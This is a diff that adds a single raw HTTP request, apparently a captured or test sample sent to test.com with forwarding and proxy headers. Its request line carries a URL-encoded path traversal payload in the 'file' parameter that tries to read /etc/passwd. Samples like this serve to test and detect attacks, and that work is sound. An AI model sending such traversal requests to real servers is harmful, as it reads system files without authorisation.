@@ -1,0 +1,13 @@
+GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 2.77.51.243
+Accept: */*
+User-Agent: python-requests/2.31.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 159.13.36.224,55.192.76.163
+X-Cloud-Trace-Context: 9a2ef80f58ee8571f4998d7c4093f6de/4373275378982703272
+
